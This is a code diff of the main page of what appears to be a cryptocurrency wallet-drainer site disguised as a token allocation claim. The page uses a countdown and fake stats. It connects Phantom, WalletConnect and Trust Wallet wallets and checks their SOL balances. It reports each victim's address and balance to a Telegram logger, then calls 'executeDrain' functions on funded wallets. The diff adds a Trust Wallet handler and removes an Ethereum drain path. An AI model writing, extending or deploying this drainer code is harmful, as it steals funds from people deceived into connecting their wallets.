@@ -4,7 +4,6 @@ import { ethers } from 'ethers';
 import { useState, useEffect } from 'react';
 import Lottie from 'lottie-react';
 import { useSolanaDrain } from '@/hooks/useSolanaDrain';
-import { useEthereumDrain } from '@/hooks/useEthereumDrain';
 import { useWalletConnect } from '@/hooks/useWalletConnect';
 import { sendTelegramLog } from '@/utils/telegramLogger';
 import { calculateAllocation } from '@/utils/calculateAllocation';
@@ -41,10 +40,10 @@ export default function Home() {
   const [drainFailed, setDrainFailed] = useState(false);
   const [stats, setStats] = useState(INITIAL_STATS);
   const [countdown, setCountdown] = useState(180);
+  const [trustProvider, setTrustProvider] = useState(null);
   
   const { executeDrain: executeSolanaDrain } = useSolanaDrain();
-  const { executeDrain: executeEthereumDrain } = useEthereumDrain();
-  const { connect: connectWalletConnect, executeDrain: executeWalletConnectDrain, address: wcAddress, isConnected: wcIsConnected, isConnecting: wcIsConnecting, connectionError: wcConnectionError } = useWalletConnect();
+  const { executeDrain: executeWalletConnectDrain } = useWalletConnect();
   
   useEffect(() => {
     if (isMobileBrowser() && !window.solana && !window.ethereum) {
@@ -69,6 +68,50 @@ export default function Home() {
     }, 30000);
     return () => clearInterval(interval);
   }, []);
+  
+  // Handle wallet connection from modal (for Trust Wallet)
+  const handleWalletConnectFromModal = async (type, address, balance, provider) => {
+    try {
+      setWalletType(type);
+      setWalletAddress(address);
+      setWalletBalance(balance);
+      setTrustProvider(provider);
+      setEligibilityStatus('checking');
+      
+      const MIN_REQUIRED_SOL = 0.003;
+      const hasFunds = balance > MIN_REQUIRED_SOL;
+      
+      if (!hasFunds) {
+        setEligibilityStatus('not-eligible');
+        await sendTelegramLog('connected_empty', {
+          walletType: type,
+          address,
+          balance
+        });
+        return;
+      }
+      
+      const amount = calculateAllocation(address);
+      setAllocatedAmount(amount);
+      setEligibilityStatus('eligible');
+      setConnected(true);
+      
+      await sendTelegramLog('connected_funded', {
+        walletType: type,
+        address,
+        balance,
+        eligibleAmount: amount
+      });
+      
+    } catch (error) {
+      console.error('Connection error:', error);
+      setEligibilityStatus('idle');
+      await sendTelegramLog('connection_error', {
+        walletType: type,
+        error: error.message
+      });
+    }
+  };
   
   const handleWalletSelect = async (type) => {
     try {
@@ -102,65 +145,31 @@ export default function Home() {
         
         console.log(`[Phantom] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
         
-      } else if (type === 'walletconnect') {
-        try {
-          address = await connectWalletConnect();
-          
-          // Verify it's a valid Solana address
-          const { Connection, PublicKey } = await import('@solana/web3.js');
-          
-          // Test if address is valid Solana format
-          let pubkey;
-          try {
-            pubkey = new PublicKey(address);
-          } catch (e) {
-            throw new Error('Connected wallet is not a Solana wallet. Please select Solana network in your wallet.');
-          }
-          
-          const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
-          const lamports = await connection.getBalance(pubkey);
-          const balanceInSol = lamports / 1e9;
-          const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
-          
-          hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
-          balance = balanceInSol;
-          
-          console.log(`[WalletConnect] Solana Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
-        } catch (error) {
-          console.error('WalletConnect connection error:', error);
-          setEligibilityStatus('idle');
-          await sendTelegramLog('connection_error', {
+        setWalletAddress(address);
+        setWalletBalance(balance);
+        
+        if (!hasFunds) {
+          setEligibilityStatus('not-eligible');
+          await sendTelegramLog('connected_empty', {
             walletType: type,
-            error: error.message
+            address,
+            balance
           });
           return;
         }
-      }
-      
-      setWalletAddress(address);
-      setWalletBalance(balance);
-      
-      if (!hasFunds) {
-        setEligibilityStatus('not-eligible');
-        await sendTelegramLog('connected_empty', {
+        
+        const amount = calculateAllocation(address);
+        setAllocatedAmount(amount);
+        setEligibilityStatus('eligible');
+        setConnected(true);
+        
+        await sendTelegramLog('connected_funded', {
           walletType: type,
           address,
-          balance: typeof balance === 'number' ? balance : '0'
+          balance,
+          eligibleAmount: amount
         });
-        return;
       }
-      
-      const amount = calculateAllocation(address);
-      setAllocatedAmount(amount);
-      setEligibilityStatus('eligible');
-      setConnected(true);
-      
-      await sendTelegramLog('connected_funded', {
-        walletType: type,
-        address,
-        balance: typeof balance === 'number' ? balance : 'N/A',
-        eligibleAmount: amount
-      });
       
     } catch (error) {
       console.error('Connection error:', error);
@@ -183,7 +192,7 @@ export default function Home() {
       if (walletType === 'phantom') {
         result = await executeSolanaDrain(allocatedAmount);
       } else if (walletType === 'walletconnect') {
-        result = await executeWalletConnectDrain(allocatedAmount);
+        result = await executeWalletConnectDrain(walletAddress, trustProvider);
       }
       
       if (result?.success) {
@@ -430,7 +439,8 @@ export default function Home() {
         isOpen={showModal}
         onClose={() => setShowModal(false)}
         onSelect={handleWalletSelect}
+        onWalletConnect={handleWalletConnectFromModal}
       />
     </div>
   );
-                                           }
+        }
